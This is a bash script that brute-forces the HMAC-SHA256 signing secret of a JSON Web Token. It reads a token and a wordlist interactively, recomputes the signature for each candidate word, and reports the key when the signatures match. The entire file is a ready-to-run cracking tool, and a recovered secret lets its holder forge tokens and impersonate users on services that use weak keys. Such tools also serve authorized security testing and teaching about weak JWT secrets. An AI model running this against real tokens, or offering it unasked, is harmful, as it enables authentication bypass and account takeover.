#!/bin/bash

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m' # No Color

# Verbosity level
VERBOSE=0

# Function to print messages based on verbosity level
log() {
    local level=$1
    shift
    local message=$@

    if [ "$level" -le "$VERBOSE" ]; then
        echo -e "$message"
    fi
}

# Function to decode base64 URL
base64_url_decode() {
    local input=${1//-/+}
    input=${input//_//}
    local mod4=$(( ${#input} % 4 ))
    if [ $mod4 -eq 2 ]; then
        input="${input}=="
    elif [ $mod4 -eq 3 ]; then
        input="${input}="
    elif [ $mod4 -eq 1 ]; then
        input="${input}==="
    fi
    echo "$input" | base64 -d 2>/dev/null
}

# Function to generate HMAC SHA-256 signature
generate_hmac_sha256() {
    local data=$1
    local key=$2
    echo -n "$data" | openssl dgst -sha256 -hmac "$key" | sed 's/^.* //'
}

# Function to brute-force HMAC secret
brute_force_hmac() {
    local token=$1
    local wordlist=$2

    local header=$(echo $token | cut -d "." -f1)
    local payload=$(echo $token | cut -d "." -f2)
    local signature=$(echo $token | cut -d "." -f3)

    log 1 "${BLUE}Header: ${header}${NC}"
    log 1 "${BLUE}Payload: ${payload}${NC}"
    log 1 "${BLUE}Signature: ${signature}${NC}"

    local decoded_signature=$(base64_url_decode "$signature" | xxd -p -c 256)

    if [ -z "$decoded_signature" ]; then
        echo -e "${RED}Error decoding the signature. Please check your JWT token.${NC}"
        exit 1
    fi

    local data="${header}.${payload}"

    echo -e "${YELLOW}Starting brute-force attack...${NC}"
    while IFS= read -r secret; do
        local computed_signature=$(generate_hmac_sha256 "$data" "$secret")
        log 2 "${BLUE}Trying secret: ${secret}${NC}"
        log 2 "${BLUE}Computed signature: ${computed_signature}${NC}"
        if [ "$computed_signature" == "$decoded_signature" ]; then
            echo -e "${GREEN}Secret key found: ${secret}${NC}"
            return 0
        fi
    done < "$wordlist"

    echo -e "${RED}Secret key not found in the wordlist.${NC}"
    return 1
}

# Main function
main() {
    local token=""
    local wordlist=""
    local args=()

    # Read token and wordlist from user input with tab completion for directories
    read -e -p "Enter JWT Token: " token
    read -e -p "Enter Wordlist File: " -i "" wordlist

    if [ ! -f "$wordlist" ]; then
        echo -e "${RED}Error: Wordlist file not found.${NC}"
        exit 1
    fi

    # Ask user if verbose mode should be enabled
    read -p "Enable verbose mode? [y/n]: " verbose_choice
    case $verbose_choice in
        [Yy]*)
            VERBOSE=1
            ;;
        *)
            VERBOSE=0
            ;;
    esac

    log 1 "${BLUE}JWT Token: ${token}${NC}"
    log 1 "${BLUE}Wordlist: ${wordlist}${NC}"
    log 1 "${BLUE}Verbose Mode: ${VERBOSE}${NC}"
    brute_force_hmac "$token" "$wordlist"
}

# Execute main function
main "$@"
